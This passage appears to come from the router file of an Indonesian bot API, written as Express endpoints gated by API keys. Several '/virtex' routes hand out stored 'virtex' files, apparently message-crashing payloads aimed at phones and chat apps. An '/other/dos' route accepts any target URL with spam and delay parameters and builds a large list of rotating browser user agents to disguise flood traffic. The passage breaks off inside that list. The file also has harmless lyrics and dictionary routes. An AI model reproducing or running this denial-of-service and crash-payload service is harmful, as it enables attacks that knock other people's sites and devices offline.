router.get('/virtex/iphone4', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let inivirtex = fs.readFileSync('./virtex/iphone4.js')
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/virtex/iphone5', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let inivirtex = fs.readFileSync('./virtex/iphone5.js')
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/virtex/iphone6', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let inivirtex = fs.readFileSync('./virtex/iphone6.js')
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/virtex/virtex', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let inivirtex = fs.readFileSync('./virtex/virtex.js')
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/virtex/ngazap', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let inivirtex = fs.readFileSync('./virtex/ngazap.js')
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/virtex/random', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let listvirtex = ['./virtex/virtex.js', './virtex/ngazap.js', './virtex/iphone.js', './virtex/iphone1.js', './virtex/iphone2.js', './virtex/iphone3.js', './virtex/iphone4.js', './virtex/iphone5.js', './virtex/iphone6.js']
        let ranvirtex = listvirtex[Math.floor(Math.random() * listvirtex.length)];
        let inivirtex = fs.readFileSync(ranvirtex)
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Other  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/other/hilih', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.kata
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter kata"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://hilih-api-zhirrr.vercel.app/api/hilih?kata=${text}`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/kbbi', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.kata
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter kata"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://kbbi-api-zhirrr.vercel.app/api/kbbi?text=${text}`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/lyrics', async (req, res, next) => {
    var apikey = req.query.apikey
    var query = req.query.query
    if (!apikey) return res.json(loghandler.noapikey)
    if (!query) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter nama lagu"
    })
    if (listkey.includes(apikey)) {
        const result = await scr.lyrics(query)
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/chord', async (req, res, next) => {
    var apikey = req.query.apikey
    var query = req.query.query
    if (!apikey) return res.json(loghandler.noapikey)
    if (!query) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter nama lagu"
    })
    if (listkey.includes(apikey)) {
        const result = await scr.chord(query)
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/dos', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.url
    var spam = req.query.spam
    var delay = req.query.delay
    var timeout = req.query.timeout
    if (!apikey) return res.json(loghandler.noapikey)
    if (!url && !spam && !elay) return res.json({
        status: false,
        creator: `${creator}`,
        message: "Example : url|spam|delay"
    })
    if (listkey.includes(apikey)) {
        res.json({
            status: true,
            creator: `${creator}`,
            message: `[ SPAM ] Spamming To : ${url}`
        })
        let useragentnya = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17', 'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4', 'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)', 'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16', 'Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4', 'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4', 'Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53', 'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53', 'Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAGWJS; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/7.1.5 Safari/537.85.14', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8', 'Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321', 'Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/7.1.2 Safari/537.85.11', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.5 Safari/534.34', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b', 'Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (X11; CrOS x86_64 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36', 'Mozilla/5.0 